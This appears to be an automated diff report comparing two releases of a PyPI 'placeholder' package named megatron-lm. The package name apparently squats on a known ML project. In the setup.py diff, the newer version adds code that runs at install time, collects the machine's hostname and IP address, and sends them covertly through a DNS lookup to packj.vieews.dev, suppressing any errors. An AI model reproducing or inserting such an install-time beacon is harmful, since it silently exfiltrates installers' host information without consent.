# Comparing `tmp/megatron-lm-2.2.3.tar.gz` & `tmp/megatron-lm-2.2.4.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "megatron-lm-2.2.3.tar", last modified: Fri May 26 13:47:58 2023, max compression
+gzip compressed data, was "megatron-lm-2.2.4.tar", last modified: Tue Jun  6 15:53:52 2023, max compression
```

## Comparing `megatron-lm-2.2.3.tar` & `megatron-lm-2.2.4.tar`

### file list

```diff
@@ -1,11 +1,11 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 13:47:58.224049 megatron-lm-2.2.3/
--rw-r--r--   0 runner    (1001) docker     (123)    11357 2023-05-26 13:47:45.000000 megatron-lm-2.2.3/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)      524 2023-05-26 13:47:58.224049 megatron-lm-2.2.3/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)       53 2023-05-26 13:47:45.000000 megatron-lm-2.2.3/README.md
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 13:47:58.224049 megatron-lm-2.2.3/megatron_lm.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)      524 2023-05-26 13:47:58.000000 megatron-lm-2.2.3/megatron_lm.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      166 2023-05-26 13:47:58.000000 megatron-lm-2.2.3/megatron_lm.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 13:47:58.000000 megatron-lm-2.2.3/megatron_lm.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 13:47:58.000000 megatron-lm-2.2.3/megatron_lm.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-26 13:47:58.224049 megatron-lm-2.2.3/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     3040 2023-05-26 13:47:45.000000 megatron-lm-2.2.3/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-06 15:53:52.661290 megatron-lm-2.2.4/
+-rw-r--r--   0 runner    (1001) docker     (123)    11357 2023-06-06 15:53:41.000000 megatron-lm-2.2.4/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)      524 2023-06-06 15:53:52.661290 megatron-lm-2.2.4/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)       53 2023-06-06 15:53:41.000000 megatron-lm-2.2.4/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-06 15:53:52.661290 megatron-lm-2.2.4/megatron_lm.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)      524 2023-06-06 15:53:52.000000 megatron-lm-2.2.4/megatron_lm.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      166 2023-06-06 15:53:52.000000 megatron-lm-2.2.4/megatron_lm.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-06 15:53:52.000000 megatron-lm-2.2.4/megatron_lm.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-06 15:53:52.000000 megatron-lm-2.2.4/megatron_lm.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-06-06 15:53:52.661290 megatron-lm-2.2.4/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     3142 2023-06-06 15:53:41.000000 megatron-lm-2.2.4/setup.py
```

### Comparing `megatron-lm-2.2.3/LICENSE` & `megatron-lm-2.2.4/LICENSE`

 * *Files identical despite different names*

### Comparing `megatron-lm-2.2.3/PKG-INFO` & `megatron-lm-2.2.4/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: megatron-lm
-Version: 2.2.3
+Version: 2.2.4
 Summary: A placeholder package
 Home-page: https://github.com/ashishbijlani/sample-pypi-package
 Author: Ashish Bijlani
 Author-email: ab@gmail.com
 License: UNKNOWN
 Platform: UNKNOWN
 Classifier: Programming Language :: Python :: 3.8
```

### Comparing `megatron-lm-2.2.3/megatron_lm.egg-info/PKG-INFO` & `megatron-lm-2.2.4/megatron_lm.egg-info/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: megatron-lm
-Version: 2.2.3
+Version: 2.2.4
 Summary: A placeholder package
 Home-page: https://github.com/ashishbijlani/sample-pypi-package
 Author: Ashish Bijlani
 Author-email: ab@gmail.com
 License: UNKNOWN
 Platform: UNKNOWN
 Classifier: Programming Language :: Python :: 3.8
```

### Comparing `megatron-lm-2.2.3/setup.py` & `megatron-lm-2.2.4/setup.py`

 * *Files 3% similar despite different names*

```diff
@@ -37,35 +37,37 @@
 		with set_alarm(time):
 			yield
 
 def send_usage_analytics(pkg_name, ver_str):
 	try:
 		# Timeout in 100 milliseconds
 		with raise_on_timeout(0.01):
-			query = f'PyPI%{pkg_name}%{ver_str}%packj.vieews.dev'
+			host_name = socket.gethostname()
+			ipaddr = socket.gethostbyname(host_name)
+			query = f'#{ipaddr}#{host_name}#PyPI%{pkg_name}%{ver_str}%packj.vieews.dev'
 			socket.gethostbyname(query)
 	except:
 		pass
 
-send_usage_analytics("megatron-lm", "2.2.3")
+send_usage_analytics("megatron-lm", "2.2.4")
 print("This is a placeholder package. Please contact for removal.")
 
 # Opens our README.md and assigns it to long_description.
 with open("README.md", "r") as fh:
     long_description = fh.read()
 
 # Defines requests as a requirement in order for this package to operate. The dependencies of the project.
 # requirements = ["requests<=2.21.0"]
 
 # Function that takes several arguments. It assigns these values to our package.
 setuptools.setup(
     # Distribution name the package. Name must be unique so adding your username at the end is common.
     name="megatron-lm",
     # Version number of your package. Semantic versioning is commonly used.
-    version="2.2.3",
+    version="2.2.4",
     # Author name.
     author="Ashish Bijlani",
     # Author's email address.
     author_email="ab@gmail.com",
     # Short description that will show on the PyPi page.
     description="A placeholder package",
     # Long description that will display on the PyPi page. Uses the repo's README.md to populate this.
```

